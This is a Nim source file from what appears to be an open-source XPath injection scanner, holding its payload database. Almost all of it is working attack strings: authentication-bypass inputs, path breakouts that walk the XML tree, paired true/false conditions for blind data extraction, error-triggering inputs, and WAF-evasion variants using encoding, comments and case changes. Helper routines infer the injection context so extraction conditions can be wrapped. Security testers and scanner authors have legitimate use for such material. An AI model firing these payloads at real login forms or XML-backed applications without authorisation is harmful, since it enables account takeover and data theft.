## XPath Injection Scanner - Advanced vulnerability detection tool.
## Coded by Chokri Hammedi (blue0x1).
## Licensed under the MIT License.
## Legal use only: use on systems you own or have explicit permission to test.

## XPath injection payload database.
## Payloads are tagged by technique and ordered by level (1=basic, 5=exotic).

import sequtils, strutils

type
  PayloadTag* = enum
    tagAuth
    tagBoolTrue
    tagBoolFalse
    tagError
    tagUnion
    tagWafBypass

  Payload* = object
    value*: string
    tag*:   PayloadTag
    level*: int
    desc*:  string

  BlindTemplate* = object
    trueTemplate*:  string
    falseTemplate*: string
    charTemplate*:  string


const AuthPayloads*: seq[Payload] = @[
  Payload(value: "' or '1'='1",           tag: tagAuth, level: 1, desc: "Classic OR bypass"),
  Payload(value: "' or '1'='1'--",        tag: tagAuth, level: 1, desc: "OR bypass with comment"),
  Payload(value: "' or 1=1 or ''='",      tag: tagAuth, level: 1, desc: "Double OR bypass"),
  Payload(value: "admin' or '1'='1",      tag: tagAuth, level: 1, desc: "Admin prefix bypass"),
  Payload(value: "' or true() or '",       tag: tagAuth, level: 1, desc: "Double OR true() bypass"),
  Payload(value: "' or position()=1 or '", tag: tagAuth, level: 2, desc: "First record by position"),
  Payload(value: "' or position()=2 or '", tag: tagAuth, level: 2, desc: "Second record by position"),
  Payload(value: "' or position()=3 or '", tag: tagAuth, level: 2, desc: "Third record by position"),
  Payload(value: "' or contains(.,'admin') or '",
    tag: tagAuth, level: 2, desc: "Search current node text for admin"),
  Payload(value: "' or contains(.,'priv') or '",
    tag: tagAuth, level: 2, desc: "Search current node text for privilege marker"),
  Payload(value: "' or contains(.,'owner') or '",
    tag: tagAuth, level: 2, desc: "Search current node text for owner"),
  Payload(value: "' or contains(.,'manager') or '",
    tag: tagAuth, level: 3, desc: "Search current node text for manager"),
  Payload(value: "' or contains(.,'operator') or '",
    tag: tagAuth, level: 3, desc: "Search current node text for operator"),
  Payload(value: "' or contains(.,'staff') or '",
    tag: tagAuth, level: 3, desc: "Search current node text for staff"),
  Payload(value: "' or contains(.,'root') or '",
    tag: tagAuth, level: 3, desc: "Search current node text for root"),
  Payload(value: "' or contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'admin') or '",
    tag: tagAuth, level: 3, desc: "Case-insensitive admin substring"),
  Payload(value: "' or contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'priv') or '",
    tag: tagAuth, level: 3, desc: "Case-insensitive privilege substring"),
  Payload(value: "' or contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'owner') or '",
    tag: tagAuth, level: 3, desc: "Case-insensitive owner substring"),
  Payload(value: "' or count(parent::*[position()=1])=0 or '",
    tag: tagAuth, level: 2, desc: "Root node test bypass"),
  Payload(value: "' or string-length('')=0 or '",
    tag: tagAuth, level: 2, desc: "Empty string length bypass"),
  Payload(value: "x' or name()='username' or 'x'='y",
    tag: tagAuth, level: 2, desc: "Node name bypass"),
  Payload(value: "' or contains(name(),'user') or '",
    tag: tagAuth, level: 3, desc: "Current node name substring"),
  Payload(value: "' or not(false()) or '",
    tag: tagAuth, level: 3, desc: "not(false()) bypass"),
  Payload(value: "' or boolean('x') or '",
    tag: tagAuth, level: 3, desc: "boolean() bypass"),
  Payload(value: "' or count(/*)>0 or '",
    tag: tagAuth, level: 3, desc: "Root child count bypass"),
  Payload(value: "' or string(0)='0' or '",
    tag: tagAuth, level: 3, desc: "String cast bypass"),
  Payload(value: "' or position()=last() or '",
    tag: tagAuth, level: 4, desc: "Last record by position"),
  Payload(value: "' or normalize-space('')='' or '",
    tag: tagAuth, level: 4, desc: "normalize-space bypass"),
  Payload(value: "' or starts-with('x','') or '",
    tag: tagAuth, level: 4, desc: "starts-with bypass"),
  Payload(value: "' or contains('x','') or '",
    tag: tagAuth, level: 4, desc: "contains bypass"),
  Payload(value: "' or translate('x','x','y')='y' or '",
    tag: tagAuth, level: 5, desc: "translate bypass"),
  Payload(value: "' or substring('abc',1,1)='a' or '",
    tag: tagAuth, level: 5, desc: "substring bypass"),
  Payload(value: "') or ('1'='1",
    tag: tagAuth, level: 1, desc: "B: Classic OR bypass one paren"),
  Payload(value: "admin') or ('1'='1",
    tag: tagAuth, level: 1, desc: "B: Admin prefix OR bypass one paren"),
  Payload(value: "') or (true()) or ('",
    tag: tagAuth, level: 1, desc: "B: true() one paren"),
  Payload(value: "') or (position()=1) or ('",
    tag: tagAuth, level: 2, desc: "B: first record by position"),
  Payload(value: "') or (position()=2) or ('",
    tag: tagAuth, level: 2, desc: "B: second record by position"),
  Payload(value: "') or (contains(.,'admin')) or ('",
    tag: tagAuth, level: 2, desc: "B: contains admin"),
  Payload(value: "') or (contains(.,'priv')) or ('",
    tag: tagAuth, level: 2, desc: "B: contains privilege marker"),
  Payload(value: "') or (contains(.,'owner')) or ('",
    tag: tagAuth, level: 2, desc: "B: contains owner"),
  Payload(value: "') or (contains(.,'manager')) or ('",
    tag: tagAuth, level: 3, desc: "B: contains manager"),
  Payload(value: "') or (contains(.,'root')) or ('",
    tag: tagAuth, level: 3, desc: "B: contains root"),
  Payload(value: "x') or (name()='admin') or ('x'='y",
    tag: tagAuth, level: 2, desc: "B: Node name one paren"),
  Payload(value: "') or (not(false())) or ('",
    tag: tagAuth, level: 2, desc: "B: not(false) one paren"),
  Payload(value: "') or (count(/*)>0) or ('",
    tag: tagAuth, level: 3, desc: "B: count one paren"),
  Payload(value: "') or (string-length('')=0) or ('",
    tag: tagAuth, level: 3, desc: "B: strlen one paren"),
  Payload(value: "') or (starts-with('x','')) or ('",
    tag: tagAuth, level: 4, desc: "B: starts-with one paren"),
  Payload(value: "') or (contains('x','')) or ('",
    tag: tagAuth, level: 4, desc: "B: contains one paren"),
  Payload(value: "')) or (('1'='1",
    tag: tagAuth, level: 2, desc: "C: Classic OR bypass two parens"),
  Payload(value: "')) or ((true())) or (('",
    tag: tagAuth, level: 2, desc: "C: true() two parens"),
  Payload(value: "')) or ((position()=1)) or (('",
    tag: tagAuth, level: 3, desc: "C: first record by position"),
  Payload(value: "')) or ((contains(.,'admin'))) or (('",
    tag: tagAuth, level: 3, desc: "C: contains admin"),
  Payload(value: "')) or ((contains(.,'priv'))) or (('",
    tag: tagAuth, level: 3, desc: "C: contains privilege marker"),
  Payload(value: "')) or ((contains(.,'owner'))) or (('",
    tag: tagAuth, level: 3, desc: "C: contains owner"),
  Payload(value: "')) or ((not(false()))) or (('",
    tag: tagAuth, level: 3, desc: "C: not(false) two parens"),
  Payload(value: "\" or \"1\"=\"1",
    tag: tagAuth, level: 2, desc: "Dq: dq Classic OR"),
  Payload(value: "\") or (\"1\"=\"1",
    tag: tagAuth, level: 2, desc: "Eq: dq) Classic OR"),
  Payload(value: "\") or (true()) or (\"",
    tag: tagAuth, level: 3, desc: "Eq: dq) true()"),
]

const PathBreakoutPayloads*: seq[Payload] = @[
  Payload(value: "')]/../*[1][text()!=('",
    tag: tagAuth, level: 2, desc: "Path breakout parent first child text non-empty"),
  Payload(value: "')]/../*[position()=1][text()!=('",
    tag: tagAuth, level: 2, desc: "Path breakout parent position first text non-empty"),
  Payload(value: "')]/../../*[1][text()!=('",
    tag: tagAuth, level: 3, desc: "Path breakout grandparent first child text non-empty"),
  Payload(value: "')]/../../../*[1][text()!=('",
    tag: tagAuth, level: 3, desc: "Path breakout rootward first child text non-empty"),
  Payload(value: "')]/ancestor::*[1]/*[1][text()!=('",
    tag: tagAuth, level: 3, desc: "Path breakout nearest ancestor first child"),
  Payload(value: "')]/ancestor-or-self::*[1]/*[1][text()!=('",
    tag: tagAuth, level: 3, desc: "Path breakout ancestor-or-self first child"),
  Payload(value: "')]/following-sibling::*[1][text()!=('",
    tag: tagAuth, level: 3, desc: "Path breakout following sibling text non-empty"),
  Payload(value: "')]/preceding-sibling::*[1][text()!=('",
    tag: tagAuth, level: 3, desc: "Path breakout preceding sibling text non-empty"),
  Payload(value: "')]/parent::*/*[last()][text()!=('",
    tag: tagAuth, level: 4, desc: "Path breakout parent last child text non-empty"),
  Payload(value: "')]/parent::*/*[position()>0][text()!=('",
    tag: tagAuth, level: 4, desc: "Path breakout parent any positioned child"),
  Payload(value: "')]/../*[contains(.,'admin')][text()!=('",
    tag: tagAuth, level: 4, desc: "Path breakout parent child contains admin"),
  Payload(value: "')]/../*[contains(.,'priv')][text()!=('",
    tag: tagAuth, level: 4, desc: "Path breakout parent child contains privilege marker"),
  Payload(value: "')]/../*[contains(.,'owner')][text()!=('",
    tag: tagAuth, level: 4, desc: "Path breakout parent child contains owner"),
  Payload(value: "')]/../*[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'admin')][text()!=('",
    tag: tagAuth, level: 5, desc: "Path breakout case-insensitive admin"),
  Payload(value: "')]/../*[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'priv')][text()!=('",
    tag: tagAuth, level: 5, desc: "Path breakout case-insensitive privilege marker"),
  Payload(value: "')]/../*[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'owner')][text()!=('",
    tag: tagAuth, level: 5, desc: "Path breakout case-insensitive owner"),
  Payload(value: "%27%29%5D%2F..%2F*%5B1%5D%5Btext%28%29%21%3D%28%27",
    tag: tagAuth, level: 4, desc: "URL-encoded path breakout parent first child"),
  Payload(value: "%27%29%5D%2F..%2F*%5Bposition%28%29%3D1%5D%5Btext%28%29%21%3D%28%27",
    tag: tagAuth, level: 4, desc: "URL-encoded path breakout parent first position"),
  Payload(value: "%27%29%5D%2F..%2F..%2F*%5B1%5D%5Btext%28%29%21%3D%28%27",
    tag: tagAuth, level: 4, desc: "URL-encoded path breakout grandparent"),
  Payload(value: "%27%29%5D%2Fancestor%3A%3A*%5B1%5D%2F*%5B1%5D%5Btext%28%29%21%3D%28%27",
    tag: tagAuth, level: 5, desc: "URL-encoded ancestor path breakout"),
  Payload(value: "&apos;)]/../*[1][text()!=(&apos;",
    tag: tagAuth, level: 4, desc: "HTML entity path breakout parent first child"),
  Payload(value: "&#39;)]/../*[1][text()!=(&#39;",
    tag: tagAuth, level: 4, desc: "Numeric HTML entity path breakout"),
]


const BoolTruePayloads*: seq[Payload] = @[
  Payload(value: "' or '1'='1",                   tag: tagBoolTrue, level: 1, desc: "A: sq 1=1"),
  Payload(value: "' or true() or 'x'='y",          tag: tagBoolTrue, level: 1, desc: "A: sq true()"),
  Payload(value: "' or 1=1 or 'a'='b",             tag: tagBoolTrue, level: 2, desc: "A: sq numeric"),
  Payload(value: "' or not(false()) or 'x'='y",    tag: tagBoolTrue, level: 3, desc: "A: sq not(false)"),
  Payload(value: "' or count(/*)>=0 or 'a'='b",    tag: tagBoolTrue, level: 3, desc: "A: sq count>=0"),
  Payload(value: "' or string-length('')=0 or '",  tag: tagBoolTrue, level: 4, desc: "A: sq strlen"),
  Payload(value: "' or boolean(1) or 'x'='y",      tag: tagBoolTrue, level: 4, desc: "A: sq boolean(1)"),
  Payload(value: "' or position()>=1 or 'x'='y",   tag: tagBoolTrue, level: 5, desc: "A: sq position"),
  Payload(value: "') and (position()>0) and ('1'='1", tag: tagBoolTrue, level: 2, desc: "B: predicate pagination first page"),
  Payload(value: "') and (position()>5) and ('1'='1", tag: tagBoolTrue, level: 3, desc: "B: predicate pagination offset 5"),

  Payload(value: "XPATHSCANNM') or ('1'='1",                   tag: tagBoolTrue, level: 1, desc: "B: sq) 1=1"),
  Payload(value: "admin') or ('1'='1",                          tag: tagBoolTrue, level: 1, desc: "B: admin prefix) 1=1"),
  Payload(value: "XPATHSCANNM') or (true()) or ('x'='y",        tag: tagBoolTrue, level: 1, desc: "B: sq) true()"),
  Payload(value: "XPATHSCANNM') or (1=1) or ('a'='b",           tag: tagBoolTrue, level: 2, desc: "B: sq) numeric"),
  Payload(value: "XPATHSCANNM') or (not(false())) or ('x'='y",  tag: tagBoolTrue, level: 3, desc: "B: sq) not(false)"),
  Payload(value: "XPATHSCANNM') or (count(/*)>=0) or ('a'='b",  tag: tagBoolTrue, level: 3, desc: "B: sq) count>=0"),
  Payload(value: "XPATHSCANNM') or (string-length('')=0) or ('", tag: tagBoolTrue, level: 4, desc: "B: sq) strlen"),
  Payload(value: "XPATHSCANNM') or (boolean(1)) or ('x'='y",    tag: tagBoolTrue, level: 4, desc: "B: sq) boolean(1)"),
  Payload(value: "XPATHSCANNM') or (position()>=1) or ('x'='y", tag: tagBoolTrue, level: 5, desc: "B: sq) position"),

  Payload(value: "XPATHSCANNM')) or (('1'='1",                  tag: tagBoolTrue, level: 2, desc: "C: sq)) 1=1"),
  Payload(value: "XPATHSCANNM')) or ((true())) or (('x'='y",    tag: tagBoolTrue, level: 2, desc: "C: sq)) true()"),
  Payload(value: "XPATHSCANNM')) or ((1=1)) or (('a'='b",       tag: tagBoolTrue, level: 3, desc: "C: sq)) numeric"),
  Payload(value: "XPATHSCANNM')) or ((not(false()))) or (('",   tag: tagBoolTrue, level: 4, desc: "C: sq)) not(false)"),
  Payload(value: "XPATHSCANNM')) or ((count(/*)>=0)) or (('",   tag: tagBoolTrue, level: 4, desc: "C: sq)) count>=0"),

  Payload(value: "\" or \"1\"=\"1",                              tag: tagBoolTrue, level: 2, desc: "Dq: dq 1=1"),
  Payload(value: "\" or true() or \"x\"=\"y",                    tag: tagBoolTrue, level: 2, desc: "Dq: dq true()"),
  Payload(value: "\" or 1=1 or \"a\"=\"b",                       tag: tagBoolTrue, level: 3, desc: "Dq: dq numeric"),

  Payload(value: "XPATHSCANNM\") or (\"1\"=\"1",                tag: tagBoolTrue, level: 2, desc: "Eq: dq) 1=1"),
  Payload(value: "XPATHSCANNM\") or (true()) or (\"x\"=\"y",    tag: tagBoolTrue, level: 3, desc: "Eq: dq) true()"),
  Payload(value: "XPATHSCANNM\")) or ((\"1\"=\"1",              tag: tagBoolTrue, level: 3, desc: "Eq: dq)) 1=1"),
  Payload(value: "')]/../*[1][text()!=('",                       tag: tagBoolTrue, level: 4, desc: "Path breakout parent first child true"),
  Payload(value: "')]/../../*[1][text()!=('",                    tag: tagBoolTrue, level: 4, desc: "Path breakout grandparent first child true"),
  Payload(value: "')]/ancestor::*[1]/*[1][text()!=('",           tag: tagBoolTrue, level: 5, desc: "Path breakout ancestor first child true"),
  Payload(value: "%27%20or%20%271%27%3D%271",                    tag: tagBoolTrue, level: 4, desc: "URL-encoded true OR"),
  Payload(value: "%27%09or%09%271%27%3D%271",                    tag: tagBoolTrue, level: 4, desc: "URL-encoded tab true OR"),
  Payload(value: "%27%0Aor%0A%271%27%3D%271",                    tag: tagBoolTrue, level: 4, desc: "URL-encoded newline true OR"),
  Payload(value: "&#39; or &#39;1&#39;=&#39;1",                  tag: tagBoolTrue, level: 4, desc: "HTML entity true OR"),
  Payload(value: "' oR '1'='1",                                  tag: tagBoolTrue, level: 4, desc: "mixed-case true OR"),
]

const BoolFalsePayloads*: seq[Payload] = @[
  Payload(value: "' or '1'='2",                                 tag: tagBoolFalse, level: 1, desc: "A: sq 1=2"),
  Payload(value: "' or false() or 'x'='y",                       tag: tagBoolFalse, level: 1, desc: "A: sq false()"),
  Payload(value: "' or 1=2 or 'a'='b",                           tag: tagBoolFalse, level: 2, desc: "A: sq numeric"),
  Payload(value: "' or not(true()) or 'x'='y",                   tag: tagBoolFalse, level: 3, desc: "A: sq not(true)"),
  Payload(value: "' or count(*)=-1 or 'a'='b",                   tag: tagBoolFalse, level: 3, desc: "A: sq count -1"),
  Payload(value: "' or string-length('')=9 or '",                tag: tagBoolFalse, level: 4, desc: "A: sq strlen=9"),
  Payload(value: "' or boolean(0) or 'x'='y",                    tag: tagBoolFalse, level: 4, desc: "A: sq boolean(0)"),
  Payload(value: "' or position()=0 or 'x'='y",                  tag: tagBoolFalse, level: 5, desc: "A: sq position=0"),
  Payload(value: "') and (position()<0) and ('1'='1",            tag: tagBoolFalse, level: 2, desc: "B: predicate pagination impossible"),
  Payload(value: "') and (position()>999999) and ('1'='1",       tag: tagBoolFalse, level: 3, desc: "B: predicate pagination high offset"),

  Payload(value: "XPATHSCANNM') or ('1'='2",                    tag: tagBoolFalse, level: 1, desc: "B: sq) 1=2"),
  Payload(value: "admin') or ('1'='2",                           tag: tagBoolFalse, level: 1, desc: "B: admin prefix) 1=2"),
  Payload(value: "XPATHSCANNM') or (false()) or ('x'='y",        tag: tagBoolFalse, level: 1, desc: "B: sq) false()"),
  Payload(value: "XPATHSCANNM') or (1=2) or ('a'='b",            tag: tagBoolFalse, level: 2, desc: "B: sq) numeric"),
  Payload(value: "XPATHSCANNM') or (not(true())) or ('x'='y",    tag: tagBoolFalse, level: 3, desc: "B: sq) not(true)"),
  Payload(value: "XPATHSCANNM') or (count(*)=-1) or ('a'='b",    tag: tagBoolFalse, level: 3, desc: "B: sq) count -1"),
  Payload(value: "XPATHSCANNM') or (string-length('')=9) or ('", tag: tagBoolFalse, level: 4, desc: "B: sq) strlen=9"),
  Payload(value: "XPATHSCANNM') or (boolean(0)) or ('x'='y",     tag: tagBoolFalse, level: 4, desc: "B: sq) boolean(0)"),
  Payload(value: "XPATHSCANNM') or (position()=0) or ('x'='y",   tag: tagBoolFalse, level: 5, desc: "B: sq) position=0"),

  Payload(value: "XPATHSCANNM')) or (('1'='2",                   tag: tagBoolFalse, level: 2, desc: "C: sq)) 1=2"),
  Payload(value: "XPATHSCANNM')) or ((false())) or (('x'='y",    tag: tagBoolFalse, level: 2, desc: "C: sq)) false()"),
  Payload(value: "XPATHSCANNM')) or ((1=2)) or (('a'='b",        tag: tagBoolFalse, level: 3, desc: "C: sq)) numeric"),
  Payload(value: "XPATHSCANNM')) or ((not(true()))) or (('",     tag: tagBoolFalse, level: 4, desc: "C: sq)) not(true)"),
  Payload(value: "XPATHSCANNM')) or ((count(*)=-1)) or (('",     tag: tagBoolFalse, level: 4, desc: "C: sq)) count -1"),

  Payload(value: "\" or \"1\"=\"2",                              tag: tagBoolFalse, level: 2, desc: "Dq: dq 1=2"),
  Payload(value: "\" or false() or \"x\"=\"y",                    tag: tagBoolFalse, level: 2, desc: "Dq: dq false()"),
  Payload(value: "\" or 1=2 or \"a\"=\"b",                        tag: tagBoolFalse, level: 3, desc: "Dq: dq numeric"),

  Payload(value: "XPATHSCANNM\") or (\"1\"=\"2",                tag: tagBoolFalse, level: 2, desc: "Eq: dq) 1=2"),
  Payload(value: "XPATHSCANNM\") or (false()) or (\"x\"=\"y",    tag: tagBoolFalse, level: 3, desc: "Eq: dq) false()"),
  Payload(value: "XPATHSCANNM\")) or ((\"1\"=\"2",              tag: tagBoolFalse, level: 3, desc: "Eq: dq)) 1=2"),
  Payload(value: "')]/../*[1][text()=('",                        tag: tagBoolFalse, level: 4, desc: "Path breakout parent first child false"),
  Payload(value: "')]/../../*[1][text()=('",                     tag: tagBoolFalse, level: 4, desc: "Path breakout grandparent first child false"),
  Payload(value: "')]/ancestor::*[1]/*[1][text()=('",            tag: tagBoolFalse, level: 5, desc: "Path breakout ancestor first child false"),
  Payload(value: "%27%20or%20%271%27%3D%272",                    tag: tagBoolFalse, level: 4, desc: "URL-encoded false OR"),
  Payload(value: "%27%09or%09%271%27%3D%272",                    tag: tagBoolFalse, level: 4, desc: "URL-encoded tab false OR"),
  Payload(value: "%27%0Aor%0A%271%27%3D%272",                    tag: tagBoolFalse, level: 4, desc: "URL-encoded newline false OR"),
  Payload(value: "&#39; or &#39;1&#39;=&#39;2",                  tag: tagBoolFalse, level: 4, desc: "HTML entity false OR"),
  Payload(value: "' oR '1'='2",                                  tag: tagBoolFalse, level: 4, desc: "mixed-case false OR"),
]


const ErrorPayloads*: seq[Payload] = @[
  Payload(value: "'",                  tag: tagError, level: 1, desc: "Single quote"),
  Payload(value: "'--",               tag: tagError, level: 1, desc: "Quote + comment"),
  Payload(value: "' and '",           tag: tagError, level: 1, desc: "Unclosed and"),
  Payload(value: "' or '",            tag: tagError, level: 1, desc: "Unclosed or"),
  Payload(value: "')",                 tag: tagError, level: 1, desc: "sq + close paren"),
  Payload(value: "') and ('",         tag: tagError, level: 1, desc: "sq) unclosed and"),
  Payload(value: "') or ('",          tag: tagError, level: 1, desc: "sq) unclosed or"),
  Payload(value: "'))",               tag: tagError, level: 2, desc: "sq + close 2 parens"),
  Payload(value: "')) and (('",       tag: tagError, level: 2, desc: "sq)) unclosed and"),
  Payload(value: "\"",                tag: tagError, level: 1, desc: "Double quote"),
  Payload(value: "\")",               tag: tagError, level: 2, desc: "dq + close paren"),
  Payload(value: "\") and (\"",       tag: tagError, level: 2, desc: "dq) unclosed and"),
  Payload(value: "'][",               tag: tagError, level: 2, desc: "Bracket break"),
  Payload(value: "')]",               tag: tagError, level: 2, desc: "Close paren+bracket"),
  Payload(value: "]]>",               tag: tagError, level: 2, desc: "CDATA close"),
  Payload(value: "%27",               tag: tagError, level: 2, desc: "URL-encoded quote"),
  Payload(value: "\\",                tag: tagError, level: 2, desc: "Backslash"),
  Payload(value: "' and 1=",          tag: tagError, level: 3, desc: "Incomplete expr"),
  Payload(value: "') and 1=",         tag: tagError, level: 3, desc: "sq) incomplete expr"),
  Payload(value: "' and count(",      tag: tagError, level: 3, desc: "Unclosed function"),
  Payload(value: "') and count(",     tag: tagError, level: 3, desc: "sq) unclosed function"),
  Payload(value: "' and substring(",  tag: tagError, level: 4, desc: "Unclosed substring"),
  Payload(value: "') and substring(", tag: tagError, level: 4, desc: "sq) unclosed substring"),
  Payload(value: "`",                 tag: tagError, level: 5, desc: "Backtick"),
  Payload(value: "' or 1 div 0 or '", tag: tagError, level: 5, desc: "Division by zero"),
  Payload(value: "') or 1 div 0 or ('",tag: tagError, level: 5, desc: "sq) div by zero"),
]


const WafBypassPayloads*: seq[Payload] = @[
  Payload(value: "%27%20or%20%271%27%3d%271",    tag: tagWafBypass, level: 3, desc: "URL encoded"),
  Payload(value: "&#39; or &#39;1&#39;=&#39;1",  tag: tagWafBypass, level: 3, desc: "HTML entity"),
  Payload(value: "' %0aor%0a '1'='1",            tag: tagWafBypass, level: 4, desc: "Newline whitespace"),
  Payload(value: "'/**/or/**/'1'='1",            tag: tagWafBypass, level: 4, desc: "Comment whitespace"),
  Payload(value: "'\tor\t'1'='1",                tag: tagWafBypass, level: 4, desc: "Tab whitespace"),
  Payload(value: "' oR '1'='1",                  tag: tagWafBypass, level: 4, desc: "Mixed case"),
  Payload(value: "' Or '1'='1",                  tag: tagWafBypass, level: 4, desc: "Mixed case 2"),
  Payload(value: "' OR '1'='1",                  tag: tagWafBypass, level: 4, desc: "Uppercase"),
]


const XpathErrorSignatures*: seq[string] = @[
  "XPathException",
  "XPath syntax error",
  "System.Xml.XPath",
  "javax.xml.xpath",
  "net.sf.saxon",
  "org.apache.xpath",
  "Error in XPath",
  "Invalid XPath",
  "XPathEvaluationResult",
  "SimpleXMLElement::xpath()",
  "xmlXPathEval",
  "xpath_parse",
  "XPathParserException",
  "XPathNavigator",
  "MS.Internal.Xml.XPath",
  "XPathNodeIterator",
  "XQuery",
  "XPathExpression",
  "XPath expression",
  "Expression must evaluate to a node-set",
  "Expecting end of expression",
  "End of expression expected",
  "A location step was expected",
  "Undefined function",
  "FODC0002",
  "XPST0003",
  "XPST0017",
  "XPTY0004",
]


const XmlDepthPaths*: seq[string] = @[
  "/*[1]",
  "/*[1]/*[1]",
  "/*[1]/*[1]/*[1]",
  "/*[1]/*[1]/*[1]/*[1]",
  "/*[1]/*[1]/*[1]/*[1]/*[1]",
  "/*[1]/*[1]/*[1]/*[1]/*[1]/*[1]",
  "/*[1]/*[1]/*[1]/*[1]/*[1]/*[1]/*[1]",
  "/*[1]/*[1]/*[1]/*[1]/*[1]/*[1]/*[1]/*[1]",
]


proc inferInjectionContext*(confirmedTrue: string): tuple[prefix, suffix: string] =
  if "XPATHSCANNM'))" in confirmedTrue:
    result = ("XPATHSCANNM')) or ((", ")) or (('a'='b")
  elif "XPATHSCANNM')" in confirmedTrue or "admin')" in confirmedTrue:
    result = ("XPATHSCANNM') or (", ") or ('a'='b")
  elif "XPATHSCANNM\")" in confirmedTrue:
    result = ("XPATHSCANNM\") or (", ") or (\"a\"=\"b")
  elif confirmedTrue.startsWith("')) and ("):
    result = ("')) and ((", ")) and (('1'='1")
  elif confirmedTrue.startsWith("') and ("):
    result = ("') and (", ") and ('1'='1")
  elif confirmedTrue.startsWith("\""):
    result = ("\" or ", " and \"1\"=\"1")
  else:
    result = ("' or ", " and '1'='1")

proc wrapCondition*(prefix, suffix, cond: string): string =
  prefix & cond & suffix


proc getPayloadsByLevel*(payloads: seq[Payload], maxLevel: int): seq[Payload] =
  payloads.filter(proc(p: Payload): bool = p.level <= maxLevel)

proc getAllErrorPayloads*(level: int): seq[Payload] =
  getPayloadsByLevel(ErrorPayloads & PathBreakoutPayloads & WafBypassPayloads, level)

proc getAllAuthPayloads*(level: int): seq[Payload] =
  getPayloadsByLevel(AuthPayloads & PathBreakoutPayloads & WafBypassPayloads, level)

proc getAllBoolPayloads*(level: int): tuple[trues: seq[Payload], falses: seq[Payload]] =
  result.trues  = getPayloadsByLevel(BoolTruePayloads, level)
  result.falses = getPayloadsByLevel(BoolFalsePayloads, level)
